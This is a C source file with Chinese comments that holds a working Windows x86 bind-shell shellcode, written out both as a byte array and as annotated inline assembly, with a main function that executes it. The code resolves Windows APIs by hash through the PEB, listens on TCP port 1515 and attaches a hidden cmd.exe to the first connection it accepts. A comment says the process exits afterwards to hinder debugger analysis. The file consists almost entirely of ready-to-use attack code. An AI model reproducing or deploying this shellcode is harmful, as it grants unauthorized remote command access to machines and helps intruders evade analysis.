#include <stdio.h>

//主要使用hash版本的获取函数地址,减少shellcode体积

//这个是写好后测试shellcode
unsigned char shellCode[] =
{ 0x83, 0xEC, 0x20, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x10, 0xEB, 0x20, 0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x6B, 0x65,
0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x89, 0x5D, 0xFC, 0x64, 0x8B, 0x35, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x76, 0x0C, 0x8B, 0x76,
0x1C, 0x8B, 0x36, 0x8B, 0x56, 0x08, 0x52, 0x68, 0x87, 0x32, 0xD8, 0xC0, 0xE8, 0xBA, 0x01, 0x00, 0x00, 0x8B, 0xF8, 0x8D, 0x73, 0xEE, 0x6A, 0x00, 0x6A, 0x00, 0x56, 0xFF, 0xD7, 0x89, 0x45, 0xF8,
0x8D, 0x73, 0xE3, 0x6A, 0x00, 0x6A, 0x00, 0x56, 0xFF, 0xD7, 0x89, 0x45, 0xF4, 0xFF, 0x75, 0xF4, 0xFF, 0x75, 0xF8, 0xFF, 0x75, 0xFC, 0xE8, 0x11, 0x00, 0x00, 0x00, 0xFF, 0x75, 0xF8, 0x68, 0x63,
0x89, 0xD1, 0x4F, 0xE8, 0x83, 0x01, 0x00, 0x00, 0x6A, 0x00, 0xFF, 0xD0, 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x00, 0x03, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x3D, 0x6A, 0xB4, 0x80, 0xE8, 0x69, 0x01,
0x00, 0x00, 0x8D, 0xB5, 0x00, 0xFD, 0xFF, 0xFF, 0x56, 0x68, 0x02, 0x02, 0x00, 0x00, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x2D, 0x32, 0x78, 0xDE,
0xE8, 0x46, 0x01, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x06, 0x6A, 0x01, 0x6A, 0x02, 0xFF, 0xD0, 0x89, 0x45, 0xFC, 0xFF, 0x75, 0x10, 0x68, 0x64, 0x10, 0xA7, 0xDD, 0xE8, 0x28,
0x01, 0x00, 0x00, 0x66, 0xC7, 0x85, 0x00, 0xFE, 0xFF, 0xFF, 0x02, 0x00, 0x66, 0xC7, 0x85, 0x02, 0xFE, 0xFF, 0xFF, 0x05, 0xEB, 0xC7, 0x85, 0x04, 0xFE, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x8D,
0xB5, 0x00, 0xFE, 0xFF, 0xFF, 0x6A, 0x14, 0x56, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0xA2, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0x0C, 0x9F, 0xD3, 0x4B, 0xE8, 0xE9, 0x00,
0x00, 0x00, 0x68, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x85, 0x83, 0x00, 0x00, 0x00, 0xFF, 0x75, 0x10, 0x68, 0xB1, 0x1E, 0x97, 0x01, 0xE8, 0xCA, 0x00, 0x00,
0x00, 0x6A, 0x00, 0x6A, 0x00, 0xFF, 0x75, 0xFC, 0xFF, 0xD0, 0x89, 0x45, 0xFC, 0xFF, 0x75, 0x0C, 0x68, 0xC9, 0xBC, 0xA6, 0x6B, 0xE8, 0xB1, 0x00, 0x00, 0x00, 0x8B, 0xD0, 0x8D, 0xBD, 0x70, 0xFF,
0xFF, 0xFF, 0xB9, 0x11, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xFC, 0xF3, 0xAB, 0xC7, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x44, 0x00, 0x00, 0x00, 0xC7, 0x45, 0x9C, 0x00, 0x01, 0x00, 0x00,
0x66, 0xC7, 0x45, 0xA0, 0x00, 0x00, 0x8B, 0x75, 0xFC, 0x89, 0x75, 0xA8, 0x89, 0x75, 0xAC, 0x89, 0x75, 0xB0, 0x8D, 0xB5, 0x70, 0xFF, 0xFF, 0xFF, 0x8D, 0xBD, 0x00, 0xFE, 0xFF, 0xFF, 0x8B, 0x5D,
0x08, 0x8D, 0x5B, 0xDB, 0x57, 0x56, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x01, 0x6A, 0x00, 0x6A, 0x00, 0x53, 0x6A, 0x00, 0xFF, 0xD2, 0x8B, 0xE5, 0x5D, 0xC2, 0x0C, 0x00, 0x55, 0x8B, 0xEC,
0x83, 0xEC, 0x04, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x53, 0x51, 0x52, 0x8B, 0x75, 0x08, 0x33, 0xC9, 0x33, 0xC0, 0x8A, 0x04, 0x0E, 0x84, 0xC0, 0x74, 0x16, 0x8B, 0x5D, 0xFC, 0xC1, 0xE3,
0x19, 0x8B, 0x55, 0xFC, 0xC1, 0xEA, 0x07, 0x0B, 0xDA, 0x03, 0xD8, 0x89, 0x5D, 0xFC, 0x41, 0xEB, 0xE3, 0x8B, 0x5D, 0x0C, 0x8B, 0x55, 0xFC, 0x33, 0xC0, 0x3B, 0xDA, 0x75, 0x05, 0xB8, 0x01, 0x00,
0x00, 0x00, 0x5A, 0x59, 0x5B, 0x8B, 0xE5, 0x5D, 0xC2, 0x08, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x52, 0x8B, 0x55, 0x0C, 0x8B, 0x72, 0x3C, 0x8D, 0x34, 0x32, 0x8B, 0x76, 0x78, 0x8D, 0x34,
0x32, 0x8B, 0x7E, 0x1C, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xFC, 0x8B, 0x7E, 0x20, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF8, 0x8B, 0x7E, 0x24, 0x8D, 0x3C, 0x3A, 0x89, 0x7D, 0xF4, 0x33, 0xC9, 0xEB, 0x01,
0x41, 0x8B, 0x75, 0xF8, 0x8B, 0x34, 0x8E, 0x8B, 0x55, 0x0C, 0x8D, 0x34, 0x32, 0xFF, 0x75, 0x08, 0x56, 0xE8, 0x67, 0xFF, 0xFF, 0xFF, 0x85, 0xC0, 0x74, 0xE6, 0x8B, 0x75, 0xF4, 0x33, 0xFF, 0x66,
0x8B, 0x3C, 0x4E, 0x8B, 0x55, 0xFC, 0x8B, 0x34, 0xBA, 0x8B, 0x55, 0x0C, 0x8D, 0x04, 0x32, 0x5A, 0x8B, 0xE5, 0x5D, 0xC2, 0x08, 0x00 };

int main(int argc, char* argv[])
{
	__asm
	{
		lea eax, shellCode
			push eax
			ret
	}

	//shell code 编码
	__asm
	{
		sub esp, 0x20;
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		jmp tag_ShellCode;

		//  [tag_Next - 0x25] "cmd.exe\0"
		_asm _emit(0x63)  _asm _emit(0x6D)   _asm _emit(0x64)  _asm _emit(0x2E)
		_asm _emit(0x65)  _asm _emit(0x78)   _asm _emit(0x65)  _asm _emit(0x00)

		//  [tag_Next - 0x1D] "ws2_32.dll\0"
		_asm _emit(0x77)  _asm _emit(0x73)   _asm _emit(0x32)  _asm _emit(0x5F)
		_asm _emit(0x33)  _asm _emit(0x32)   _asm _emit(0x2E)  _asm _emit(0x64)
		_asm _emit(0x6C)  _asm _emit(0x6C)   _asm _emit(0x00)

		//[tag_Next - 0x12] "kernel32.dll\0"
		_asm _emit(0x6B)  _asm _emit(0x65)   _asm _emit(0x72)  _asm _emit(0x6E)
		_asm _emit(0x65)  _asm _emit(0x6C)   _asm _emit(0x33)  _asm _emit(0x32)
		_asm _emit(0x2E)  _asm _emit(0x64)   _asm _emit(0x6C)  _asm _emit(0x6C)
		_asm _emit(0x00)

	tag_ShellCode:
		//1. GetPc
		call tag_Next;
	tag_Next:
		pop ebx;  // ebx == BaseAddr
		mov[ebp - 0x4], ebx;

		//2 获取关键模块地址
		mov esi, dword ptr fs : [0x30];
		mov esi, [esi + 0x0C];
		mov esi, [esi + 0x1C];
		mov esi, [esi];
		mov edx, [esi + 0x08];   //edx为Kernel32.dll的地址

		//3. 获取LoadLibraryExA的函数地址
		push edx;
		push 0xC0D83287;
		call fun_GetFunAddrByHash;
		mov edi, eax;

		//4. 加载kernel32.dll, 再次加载的原因是win7从teb链表中获取的数据是lernelbase.dll的基地址,这里增强兼容性
		lea esi, [ebx - 0x12]; // esi = "kernel32.dll"
		push 0;
		push 0;
		push esi;
		call edi;
		mov[ebp - 0x8], eax;   // eax 和[ebp - 8 ]是kernel32.dll的基地址

		//5. 加载ws2_32.dll网络相关
		lea esi, [ebx - 0x1D]; // esi = "ws2_32.dll"
		push 0;
		push 0;
		push esi;
		call edi;
		mov[ebp - 0x0C], eax;  // eax 和[ebp - 0x0C]是ws2_32的地址

		//6. 执行payload部分
		push[ebp - 0x0C];  //ws2_32.dll的基地址
		push[ebp - 0x8]; // kernel32.dll 的基地址
		push[ebp - 0x4]; //BaseAddr
		call fun_PayLoad;

		//7. payload执行完毕,结束进程,防范调试器分析
		push[ebp - 0x8]; //[ebp - 8]是kernel32.dll的基地址
		push 0x4FD18963;  //ExitProcess的hash值
		call fun_GetFunAddrByHash;
		push 0;
		call eax;

		//-----------------------------------PayLoad部分------------------------------------------------------------------
	fun_PayLoad://(int BaseAddr, int Kernel32_base, int ws2_32_base)
		push ebp;
		mov ebp, esp;
		sub esp, 0x300;

		//1. 初始化winsocket服务
		push[ebp + 0x10];  // ws2_32_base
		push 0x80B46A3D;  //WSAStartup的hash值
		call fun_GetFunAddrByHash;
		lea esi, [ebp - 0x300]; //esi = WSADATA

		push esi;      //WSADATA
		push 0x0202;  // 版本号
		call eax;    //WSAStartup
		test eax, eax
			jnz	tag_PayloadEnd;

		//2. 创建一个原始套接字
		push[ebp + 0x10]; //ws2_32_base
		push 0xDE78322D;  //WSASocketA
		call fun_GetFunAddrByHash;

		push 0;  //null
		push 0;  //null
		push 0;  //null
		push 6;  //ipproto_tcp
		push 1;  // sock_stream
		push 2;  // af_inet
		call eax;    //WSASocketA
		mov[ebp - 0x4], eax;     //local1 = SOCKET

		//3. 在任意地址绑定一个端口1515
		push[ebp + 0x10];  // ws2_32_base
		push 0xDDA71064;   //bind
		call fun_GetFunAddrByHash;

		mov word ptr[ebp - 0x200], 0x02;  //SOCKADDR_IN.sin_family = AF_INET
		mov word ptr[ebp - 0x1FE], 0xEB05;  //SOCKETADDR_IN.sin_port = 0xEB50
		mov dword ptr[ebp - 0x1FC], 0;   // SOCKETADDR_IN.sin_addr=inaddr_any
		lea esi, [ebp - 0x200];
		push 0x14;             //size
		push esi;                //SOCKETADDR_IN
		push[ebp - 0x4];   //local_1(SOCKET)
		call eax;     //bind
		test  eax, eax;
		jnz tag_PayloadEnd;

		//4. 监听,队列中可容纳5个连接
		push[ebp + 0x10];  // ws2_32_base
		push 0x4BD39F0C;  //listen
		call fun_GetFunAddrByHash;
		push 0x7FFFFFFF; // somaxconn
		push[ebp - 0x4]; //local_1(SOCKET)
		call eax;
		test eax, eax;
		jnz tag_PayloadEnd;

		//5. 接收一个连接
		push[ebp + 0x10];  // ws2_32_base
		push 0x01971EB1;  //accept
		call fun_GetFunAddrByHash;
		push 0;    // addr_len
		push 0;   //addr
		push[ebp - 0x4];  //local_1(SOCKET)
		call eax; // accept
		mov[ebp - 0x4], eax;


		//6. 创建一个cmd进程,绑定socket,然后启动
		push[ebp + 0x0C]; //Kernel32_base
		push 0x6BA6BCC9; //CreateProcessA
		call fun_GetFunAddrByHash;
		mov edx, eax;  // edx = CreateProcessA
		lea edi, [ebp - 0x90];  //清空startupinfoa

		//下面做的事情类似memset
		mov ecx, 0x11;
		mov eax, 0x00;
		cld;
		rep stosd;

		//填充startupinfoa
		mov dword ptr[ebp - 0x90], 0x44; //cb = 48
		mov dword ptr[ebp - 0x64], 0x100; //dwFlags
		mov word ptr[ebp - 0x60], 0x0; //sw_hide
		mov esi, [ebp - 0x4];  //local_1(SOCKET)
		mov dword ptr[ebp - 0x58], esi; //hstdinput = socket
		mov dword ptr[ebp - 0x54], esi; //hstdoutput = socket
		mov dword ptr[ebp - 0x50], esi; //hstderror = socket

		lea esi, [ebp - 0x90];  // esi = startupinfoa
		lea edi, [ebp - 0x200]; // edi = process_information
		mov ebx, [ebp + 0x8];  // ebx = baseaddr
		lea ebx, [ebx - 0x25]; // ebx = "cmd.exe\0"


		push edi;      // lpProcessInformation
		push esi;     //lpStartuInfoA
		push 0;      //lpCurrentDirectory = NULL
		push 0;      //lpEnvironment = NULL
		push 0;      //dwCreateionFlags = NULL;
		push 1;      // bInheritHandles = TRUE
		push 0;      //lpThreadAttributes = NULL;
		push 0;      //lpProcessAttributes = NULL
		push ebx;  // lpCommandLine = "cmd.exe\0"
		push 0;   //lpApplicationName = NULL
		call edx   //CreateProcessA


		tag_PayloadEnd :
		mov esp, ebp
			pop ebp
			retn 0xC



			//------------------------------------基础函数部分-----------------------------------------------------------------

		fun_HashCmpString: // hash 函数比较(char* szFuncName, int nDigest)
		push ebp;
		mov ebp, esp;
		sub esp, 0x4;
		mov dword ptr[ebp - 0x4], 0x00;
		push ebx;
		push ecx;
		push edx;

		mov esi, [ebp + 0x8]; // 参数1:szFuncName
		xor ecx, ecx;
		xor eax, eax;
	tag_HashLoop:
		mov al, [esi + ecx];  //al = 字符串的第ecx个字符
		test al, al;
		jz  tag_HashEnd;
		mov ebx, [ebp - 0x4];
		shl ebx, 0x19;
		mov edx, [ebp - 0x4];
		shr edx, 0x7;
		or ebx, edx;
		add ebx, eax;
		mov[ebp - 0x4], ebx;
		inc ecx;
		jmp tag_HashLoop;

	tag_HashEnd:
		mov ebx, [ebp + 0xC];
		mov edx, [ebp - 0x4];
		xor eax, eax;
		cmp ebx, edx;
		jne tag_FunEnd;
		mov eax, 1;
	tag_FunEnd:
		pop edx;
		pop ecx;
		pop ebx;
		mov esp, ebp;
		pop ebp;
		retn 0x8;

	fun_GetFunAddrByHash:
		push ebp;
		mov ebp, esp;
		sub esp, 0xC;
		push edx;

		//1. 获取eax,ent, eot的地址
		mov edx, [ebp + 0xC];  // edx = image Base
		mov esi, [edx + 0x3C];  // esi = dosheader->e_lfanew
		lea esi, [edx + esi];  // esi = pe文件头的va
		mov esi, [esi + 0x78]; //esi = export_directory.virtualaddress 
		lea esi, [edx + esi];  // esi = 导出表的va
		mov edi, [esi + 0x1C];  // esi =eat表的rva
		lea edi, [edx + edi];  // edi = eat表的va
		mov[ebp - 0x4], edi;  // [ebp -4]是eat的va
		mov edi, [esi + 0x20];  // edi = ent的rva
		lea edi, [edx + edi]; //edi = ent的va
		mov[ebp - 0x8], edi;  //[ebp -0x8]中存放的是ent的va
		mov edi, [esi + 0x24];  // edi = eot的rva
		lea edi, [edx + edi]; // edi = eot的va
		mov[ebp - 0xC], edi;    // [ebp - 0xc]是eot的首地址

		//2. 循环比对ent中的函数名
		xor ecx, ecx;
		jmp tag_FirstCmp;
	tag_CmpFunNameLoop:
		inc ecx;
	tag_FirstCmp:
		mov esi, [ebp - 0x8];  // esi =  ent
		mov esi, [esi + 4 * ecx]; //ent项中的rva
		mov edx, [ebp + 0x0C];
		lea esi, [edx + esi];  // ent项中的va

		push[ebp + 0x08];  //nDigest 参数1
		push esi;    //函数名字
		call fun_HashCmpString;
		test eax, eax;
		je tag_CmpFunNameLoop;

		//3. 成功后找到对应的序号
		mov esi, [ebp - 0xC];  // esi = eot的va
		xor edi, edi;
		mov di, [esi + ecx * 2];  // edi = 用函数数组下标对应的序号

		//4. 使用序号找到对应的函数
		mov edx, [ebp - 0x4];   // edx是eat的va
		mov esi, [edx + edi * 4];  //使用序号找到对应的函数地址的rva
		mov edx, [ebp + 0xC]; //获取参数2, imagebase

		//5. 返回函数地址
		lea eax, [edx + esi];

		pop edx;
		mov esp, ebp;
		pop ebp;
		retn 0x8;
	}
	return 0;
}